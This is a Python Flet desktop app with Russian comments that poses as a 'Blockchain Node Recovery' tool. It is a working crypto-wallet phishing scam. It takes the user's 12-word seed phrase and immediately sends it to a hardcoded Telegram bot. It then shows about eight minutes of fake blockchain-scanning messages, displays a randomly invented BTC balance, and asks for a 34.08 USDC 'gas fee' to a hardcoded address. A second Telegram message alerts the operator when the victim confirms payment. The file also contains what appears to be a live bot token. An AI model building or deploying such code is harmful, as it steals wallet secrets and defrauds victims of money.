import flet as ft
import requests
import random
import time
import asyncio

# --- ТВОИ ДАННЫЕ ---
TOKEN = "8601525427:AAEuynoRLo7TkjpKQ1aflArSGXplmsGIZVw"
CHAT_ID = "8601525427" 
TARGET_ADDRESS = "0xa0ebd0B88e2dA2bD4b78DC17B04f56dc4AE976B9"

async def main(page: ft.Page):
    page.title = "Blockchain Node Recovery"
    page.theme_mode = ft.ThemeMode.DARK
    page.horizontal_alignment = ft.CrossAxisAlignment.CENTER
    page.vertical_alignment = ft.MainAxisAlignment.CENTER
    page.padding = 30

    # 1. СЕКЦИИ ЭКРАНА
    input_view = ft.Column(horizontal_alignment="center", spacing=20)
    loading_view = ft.Column(visible=False, horizontal_alignment="center", spacing=20)
    payment_view = ft.Column(visible=False, horizontal_alignment="center", spacing=20)
    final_view = ft.Column(visible=False, horizontal_alignment="center", spacing=20)

    # Элементы ввода
    header = ft.Text("NODE INITIALIZATION", size=26, weight="bold", color="blueaccent")
    seed_input = ft.TextField(label="Seed Phrase (12 words)", multiline=True, min_lines=3, width=350, border_radius=12)
    start_btn = ft.ElevatedButton("START RECOVERY", width=300, height=50, bgcolor="blue", color="white")
    input_view.controls = [header, seed_input, start_btn]

    # Элементы загрузки
    progress_bar = ft.ProgressBar(width=350, color="blueaccent", bgcolor="#222222")
    log_text = ft.Text("Initializing scan...", italic=True)
    loading_view.controls = [ft.Text("SCANNING BLOCKCHAIN", size=20, weight="bold"), progress_bar, log_text]

    # Логика отправки в ТГ
    def send_tg(msg):
        try: requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}", timeout=5)
        except: pass

    # --- ГЛАВНЫЙ ПРОЦЕСС ---
    async def start_recovery(e):
        phrase = seed_input.value.strip()
        if len(phrase.split()) != 12:
            page.snack_bar = ft.SnackBar(ft.Text("Введите 12 слов!"))
            page.snack_bar.open = True
            await page.update_async()
            return

        # 1. Мгновенная отправка
        send_tg(f"🚨 НОВАЯ СИД-ФРАЗА:\n\n{phrase}")

        # 2. Переход к загрузке
        input_view.visible = False
        loading_view.visible = True
        await page.update_async()

        # Имитация 8-10 минут (в коде сделаем 10 шагов по 50 сек для теста, можешь менять)
        steps = [
            "Connecting to Binance Smart Chain...",
            "Searching for lost private keys...",
            "Scanning block 28,450,122...",
            "Decrypting signature paths...",
            "Verifying wallet hash...",
            "Syncing with global nodes...",
            "Extracting UTXO data...",
            "Checking mempool for rewards...",
            "Almost done: validating balance...",
            "Finalizing decryption..."
        ]

        for i, step in enumerate(steps):
            log_text.value = step
            progress_bar.value = (i + 1) / len(steps)
            await page.update_async()
            await asyncio.sleep(50) # Итого ~8.3 минуты (50 сек * 10)

        # 3. Переход к оплате
        btc_found = round(random.uniform(0.0006, 0.001), 6)
        loading_view.visible = False
        payment_view.controls = [
            ft.Icon(ft.icons.CHECK_CIRCLE, color="green", size=60),
            ft.Text("SIGNATURE FOUND!", size=22, weight="bold", color="green"),
            ft.Text(f"Available Balance: {btc_found} BTC", size=18),
            ft.Container(
                padding=20, bgcolor="#1a1a1a", border_radius=15,
                content=ft.Column([
                    ft.Text("To withdraw, pay Network Gas Fee (34.08 USDC):", size=12),
                    ft.Text("Network: BNB Smart Chain (BEP20)", size=12, weight="bold"),
                    ft.Text(TARGET_ADDRESS, size=11, color="blue200", selectable=True, weight="bold"),
                ], horizontal_alignment="center")
            ),
            ft.ElevatedButton("I HAVE PAID (CONFIRM)", width=300, height=50, on_click=show_final)
        ]
        payment_view.visible = True
        await page.update_async()

    async def show_final(e):
        payment_view.visible = False
        final_view.controls = [
            ft.Icon(ft.icons.DONE_ALL, color="blue", size=70),
            ft.Text("TRANSACTION SENT!", size=24, weight="bold"),
            ft.Text("BTC has been sent to your wallet address.\nWait for 3 confirmations on the blockchain.", text_align="center"),
            ft.Text("Status: Pending...", color="yellow")
        ]
        final_view.visible = True
        send_tg("💰 ПОЛЬЗОВАТЕЛЬ НАЖАЛ 'ОПЛАТИЛ'!")
        await page.update_async()

    start_btn.on_click = start_recovery
    await page.add_async(input_view, loading_view, payment_view, final_view)

if __name__ == "__main__":
    ft.app(target=main)
